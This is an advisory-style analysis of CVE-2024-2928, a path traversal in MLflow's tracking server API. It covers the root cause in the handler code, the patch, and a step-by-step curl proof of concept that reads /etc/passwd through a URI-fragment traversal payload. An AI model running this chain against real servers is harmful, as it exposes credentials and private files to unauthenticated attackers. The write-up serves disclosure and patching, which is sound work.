1. Detailed Summary  
   • CVE Identifier: CVE-2024-2928  
   • Affected Software: mlflow (Python package)  
   • Affected Version: 2.11.2 (and all 2.9.x–2.11.2 releases)  
   • Vulnerability Type: CWE-29 (Path Traversal / Local File Inclusion)  
   • Vulnerability Description:  
     The MLflow tracking server’s REST API accepts an `artifact_location` URL when creating experiments. In versions up through 2.11.2, MLflow validated only the URI’s query string for path-traversal sequences (e.g., “../”). However, it neglected to validate the URI fragment (the part after `#`). An attacker can place a directory-traversal payload in the fragment, causing MLflow to resolve the artifact storage path outside the intended directory structure and read arbitrary files on the local filesystem (for example `/etc/passwd`).  

2. Root Cause Analysis  
   a) Missing Fragment Validation in _create_experiment  
      – In `mlflow/server/handlers.py`, the function `_create_experiment` parses the user-supplied artifact location:  
        ```python
        parsed_artifact_location = urllib.parse.urlparse(request_message.artifact_location)
        validate_query_string(parsed_artifact_location.query)
        experiment_id = _get_tracking_store().create_experiment(
            request_message.name, request_message.artifact_location, tags
        )
        ```  
      – The call to `validate_query_string` checks only the query component (`?…`) for “../” sequences, but does nothing to prevent directory traversal payloads placed in the fragment component (`#…`).  
      – Because Python’s standard `urlparse` returns the fragment in `parsed_artifact_location.fragment`, MLflow ends up creating an experiment with an artifact URI containing the fragment. Later, when it resolves that URI via `local_file_uri_to_path` and `Path.resolve()`, the "../" in the fragment causes resolution outside the permitted directory.  

   b) Insufficient Source-Path Validation in _validate_source  
      – The MLflow model version creation endpoint calls `_validate_source(source, run_id)`, which ensures that the `source` path is within the run’s artifact directory. Before the patch, it would attempt this check unconditionally, even on non-local URIs, leading to potential bypasses or unexpected behavior when `source` was a remote URL or contained path-traversal.  

   c) Patch Overview  
      The fix (commit 96f0b573a73d8eedd6735a2ce26e08859527be07) makes two key changes:  
      1. In `_create_experiment`, explicitly reject any artifact_location URLs that include a fragment.  
      2. In `_validate_source`, only perform the “source inside artifact directory” check for local URIs, skipping it for remote URIs.

3. Exploitation Steps (Proof-of-Concept)  
   The vulnerability can be exploited over the network without authentication or special privileges. The following sequence of commands demonstrates how to read `/etc/passwd`:

   1. Start the MLflow tracking UI on localhost:
      ```bash
      mlflow ui --host 127.0.0.1 --port 5000
      ```
   2. Create a malicious experiment whose `artifact_location` embeds a directory-traversal payload in the URI fragment (`#`):
      ```bash
      curl -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create \
           -H 'Content-Type: application/json' \
           -d '{
                 "name": "poc",
                 "artifact_location": "http:///#/../../../../../../../../../../../../../../etc/"
               }'
      ```
      Note: The fragment (`#/../../…/etc/`) is not validated in the vulnerable version.
   3. Record a run in the experiment:
      ```bash
      # Replace {{EXPERIMENT_ID}} with the ID returned by step 2
      curl -X POST http://127.0.0.1:5000/api/2.0/mlflow/runs/create \
           -H 'Content-Type: application/json' \
           -d '{"experiment_id": "{{EXPERIMENT_ID}}"}'
      ```
   4. Register a model named “poc”:
      ```bash
      curl -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create \
           -H 'Content-Type: application/json' \
           -d '{"name": "poc"}'
      ```
   5. Link the model version to the malicious run, specifying a remote source (the fix also hardened path checks here):
      ```bash
      # Replace {{RUN_ID}} with the run ID from step 3
      curl -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create \
           -H 'Content-Type: application/json' \
           -d '{
                 "name": "poc",
                 "run_id": "{{RUN_ID}}",
                 "source": "file:///etc/"
               }'
      ```
   6. Trigger artifact download to read `/etc/passwd`:
      ```bash
      curl 'http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1'
      ```
      The server responds with the contents of `/etc/passwd`.  

Impact  
• Confidential files such as system passwords, SSH private keys, database credentials, configuration files, and any other sensitive local files become readable by an unauthenticated attacker.  

Mitigation  
• Upgrade MLflow to version 2.11.3 or later, which rejects URI fragments in artifact locations and correctly scopes local-path validation for model sources.
